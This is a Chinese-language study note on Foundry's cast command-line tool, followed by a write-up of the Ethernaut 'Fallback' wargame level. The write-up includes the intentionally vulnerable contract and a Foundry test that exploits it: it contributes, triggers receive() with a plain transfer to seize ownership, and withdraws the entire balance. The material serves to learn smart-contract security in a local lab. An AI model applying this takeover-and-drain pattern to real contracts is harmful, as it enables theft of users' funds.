# cast

## **cast**

### 常用命令

| 命令 | 说明 |
| --- | --- |
| `4byte` | 根据 selector 查询函数签名（openchain.xyz） |
| `4byte-decode` | 解码 ABI 编码的 calldata |
| `abi-encode` | ABI 编码函数参数（不含 selector） |
| `access-list` | 为交易生成 access list |
| `address-zero` | 打印全零地址 `0x000...000` |
| `admin` | 获取合约管理员地址（EIP-1967） |
| `age` | 获取区块时间戳 |
| `artifact` | 生成合约部署 artifact 文件 |
| **<font style="background-color:#f3bb2f;">balance</font>** | 查询账户余额（wei） |
| `base-fee` | 获取区块 base fee |
| `bind` | 生成 Rust ABI 绑定 |
| **<font style="background-color:#f3bb2f;">block</font>** | 获取区块信息 |
| `block-number` | 获取当前最新区块号 |
| **<font style="background-color:#f3bb2f;">call</font>** | 本地调用函数（不发交易） |
| `calldata` | 编码函数名和参数为 calldata |
| `chain-id` | 获取网络 Chain ID |
| `client` | 获取节点客户端版本 |
| `code` | 获取合约代码 |
| `decode-abi` | 解码 ABI 编码数据 |
| `decode-calldata` | 解码 calldata |
| `decode-event` | 解码事件数据 |
| `estimate` | 估算交易 gas |
| `find-block` | 根据时间戳查找区块 |
| `from-wei` | 将 wei 转换为 ETH |
| `gas-price` | 获取当前 gas 价格 |
| `hash-message` | EIP-191 哈希消息 |
| `implementation` | 获取合约实现地址（EIP-1967） |
| **<font style="background-color:#f3bb2f;">keccak</font>** | 计算 Keccak-256 哈希 |
| `logs` | 获取事件日志 |
| `namehash` | 计算 ENS namehash |
| `nonce` | 获取账户 nonce |
| `pretty-calldata` | 美化 calldata |
| `receipt` | 获取交易回执 |
| `rpc` | 原始 RPC 请求 |
| `run` | 本地模拟已发布交易执行 |
| **<font style="background-color:#f3bb2f;">send</font>** | 签名并发送交易 |
| `sig` | 获取函数 selector |
| `source` | 获取合约源代码 |
| <font style="background-color:#f3bb2f;">storage</font> | 读取存储槽数据 |
| `to-ascii` | 十六进制转 ASCII |
| `to-utf8` | 十六进制转 UTF-8 |
| **<font style="background-color:#f3bb2f;">to-wei</font>** | 将 ETH 转换为 wei |
| **<font style="background-color:#f3bb2f;">tx</font>** | 获取交易信息 |
| `wallet` | 钱包工具 |

### 通用选项

| 选项 | 说明 |
| --- | --- |
| `-h, --help` | 显示帮助信息 |
| `-V, --version` | 显示版本 |
| `-j, --threads` | 设置线程数量（0 为自动） |
| `--json` | JSON 输出模式 |
| `-q, --quiet` | 安静模式 |
| `-v, --verbosity` | 日志等级（可叠加） |

更多内容：[cast 官方文档](https://book.getfoundry.sh/reference/cast/cast.html)

### 常见命令+实例

#### `cast balance` — 查看账户余额

查看某个地址上的以太坊余额（单位：wei）

```solidity
cast balance 0x742d35Cc6634C0532925a3b844Bc454e4438f44e
```

**中文**：查询地址 `0x742d...f44e` 的以太币余额。

***

#### `cast call` — 调用合约函数（不会发交易）

模拟调用一个合约函数，不上链，仅查看结果。

```solidity
cast call 0xdAC17F958D2ee523a2206206994597C13D831ec7 \
"balanceOf(address)(uint256)" 0x742d35Cc6634C0532925a3b844Bc454e4438f44e
```

**中文**：调用 USDT 合约的 `balanceOf` 函数，查询某地址的 USDT 余额。

***

#### `cast send` — 发出交易（需要私钥）

```solidity
cast send 0xYourContractAddress "setValue(uint256)" 123 \
--private-key 0xYourPrivateKey
```

**中文**：调用合约的 `setValue` 函数，传入 123，上链执行（需要钱包私钥）。

***

#### `cast calldata` — 构造 ABI 编码

```solidity
cast calldata "transfer(address,uint256)" 0xabc123... 1000
```

**中文**：将 `transfer` 函数和参数编码成交易数据（calldata）。

***

#### `cast block` — 查询区块信息

```solidity
cast block latest
```

**中文**：获取当前最新区块的详细信息。

***

#### `cast to-wei` & `cast from-wei` — 单位转换

```solidity
cast to-wei 1 ether
# 输出：1000000000000000000

cast from-wei 1000000000000000000 ether
# 输出：1.0
```

**中文**：1 ETH 转成 wei；1000000000000000000 wei 转回 1 ETH。

***

#### `cast keccak` — 哈希函数

```solidity
cast keccak "hello"
# 输出：0x...
```

**中文**：对字符串 `"hello"` 使用 keccak256 哈希。

***

#### `cast tx` — 查看交易详情

```solidity
cast tx 0xYourTxHash
```

**中文**：查看交易哈希为 `0x...` 的交易详情。

##

## Fallback（test部署版。。forge）

### 准备

1. 创一个新foundry项目`my-first-foundry`

```solidity
forge init my-first-foundry
```

2. 进入刚创的foundry项目目录

```solidity
cd my-first-foundry
```

![](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20250409142009329.png)

3. 安装标准库 `forge-std`，提供了 `console.log`, `vm` 等测试工具，因为测试 Ethernaut 合约时必须依赖它的工具函数，如 `vm.prank()` 等

```solidity
forge install foundry-rs/forge-std --no-commit
```

![](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20250409142254720.png)

### 合约源码分析

**目标**：

* 获得这个合约的所有权
* 把他的余额减到0

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

* `contribute()`：每次捐赠限制为小于 0.001 ETH，且如果捐赠者的贡献超过 `owner`，会更新 `owner` 为捐赠者。
* `receive()`：当合约接收到一笔\*\*普通转账（没有调用函数）\*\*时，如果 `msg.sender` 曾经调用过 `contribute()`（即贡献过任意金额），那么会直接把 `owner` 设置为 `msg.sender`

**<font style="background-color:#f3bb2f;">可知，两个函数都能改变owner，但</font>**`contrubute`**<font style="background-color:#f3bb2f;">的条件太难，居然在每次贡献不超0.001ETH的限制下要达到1000ETH，显然走不通，所以走</font>**`receive`**<font style="background-color:#f3bb2f;">这条路，相对来说更容易实现</font>**

* `withdraw()`：只有 `owner` 可以提取合约中的 ETH。

### 攻击思路

1. \*\*调用 `contribute()` ：\*\*捐赠一点 ETH（如 0.0001 ether）

<font style="background-color:#f3bb2f;">receive() 里的逻辑 </font>**<font style="background-color:#f3bb2f;">只有你是贡献者</font>**<font style="background-color:#f3bb2f;"> 的时候才会考虑把你设为 owner，所以需要先 contribute()</font>

```
- **条件**： `< 0.001 ether`
- 目的是**成为贡献者，满足 **`receive()`** 的触发条件**。
```

2\. **再直接给合约地址转账，触发 **`receive()`**：**
\- **触发条件**：`msg.value > 0`,意思就是只要转了就行，大于零就行，没有指标
3\. **获得 owner 权限后，调用 **`withdraw()`** 提现合约余额，通关**

### 写的测试合约

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";//引入Foundry提供的测试库
import "../contracts/FallbackChallenge.sol"; //引入要测试的合约

contract FallbackTest is Test {//定义一个新的测试合约
    FallbackChallenge public fallbackContract; //定义一个公共变量fallbackcontract作为合约的实例，用它来调用合约的函数
    address public attacker; //定义一个模拟attacker地址的变量

    // 测试前的设置
    function setUp() public { //这是每个测试执行前都会运行的初始化函数
        attacker = makeAddr("attacker"); //创建一个地址叫attacker
        vm.deal(attacker,1 ether);      //给这个地址1ETH的初始余额
        fallbackContract = new FallbackChallenge(); //部署 FallbackChallenge 合约
    }

    function testExploit() public {//定义一个测试函数，这个函数的名字 testExploit 代表着测试攻击合约的exploit行为(这个闯关做的一系列行为就是exploit)
        // 第一步：调用contribute()，让attacker成为contributors之一
        vm.prank(attacker); //模拟attacker发起的交易
        fallbackContract.contribute{value:0.0001ether}(); //调用合约中的contribute函数，让attacker地址参与到合约，并贡献0.0001ETH（小于0.001ETH就行）

        // 第二步：向合约地址发一笔交易（没有调用函数），这样会触发receive()
        vm.prank(attacker);//再次模拟attacker发起的交易
        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");//向fallbackcontract发送一笔转账，注意双引号内空表示不带任何calldata,即数据为空,然后就能触发receive()
        require(success, "call failed");//(ai给我加上的这句)如果转账失败，则测试会报错，确保合约行为正常

        // 第三步：攻击成功，owner变成attacker，断言验证（这个断言验证是ai说要加的，我也不知道加不加）
        assertEq(fallbackContract.owner(), attacker);

        // 第四步：调用withdraw提取合约余额
        vm.prank(attacker);//再次模拟attacker发起的交易
        fallbackContract.withdraw();//调用withdraw()函数,将合约的所有余额转走,转到attacker地址,然后合约余额就变成0了

        // 第五步：验证合约余额为0，闯关成功（这个断言验证是ai说要加的，我也不知道加不加）
        assertEq(address(fallbackContract).balance, 0);
    }
}

```

1. 终端输入<font style="background-color:#f3bb2f;">forge build</font>来**编译合约**

![](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20250410190949604.png)

2. 终端输入<font style="background-color:#f3bb2f;">forge test</font>，**编写并运行测试**

![](C:\Users\HUAWEI\AppData\Roaming\Typora\typora-user-images\image-20250410191020498.png)

说明成功了

### 用到的foundry工具以及注意事项

1. `vm.prank()`：模拟 msg.sender

比如测试合约中写的`vm.prank(attacker)`,就是,以 attacker 身份执行下一个操作

* `vm.deal` / `vm.prank` 是 Foundry 测试中控制测试账户和行为的工具；

2. `call{value: ...}`：发送 ETH(要 payable 函数或 call）

比如测试合约中写的`call{value: 0.0001 ether}("")`,就是直接转0.0001ETH,("")就表示数据为空,不调用函数

因为这里涉及到\*\*<font style="background-color:#f3bb2f;">receive()和fallback()的区别</font>**(去翻**WTF102\*\*的笔记)

```solidity
触发fallback() 还是 receive()?
           接收ETH
              |
         msg.data是空？
            /  \
          是    否
          /      \
receive()存在?   fallback()
        / \
       是  否
      /     \
receive()   fallback()
```

**如果数据不为空的话,就会调用**`fallback()`**而不是**`receive()`**,就没办法闯关了**

3. `assertEq(a, b)`:断言检查是否一致（测试是否通过）

比如测试合约里写的`assertEq(fallbackContract.owner(), attacker);`,就是验证是否成为 owner


> 更新: 2025-07-11 10:39:56  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/fu0dht4oc85b3xkb>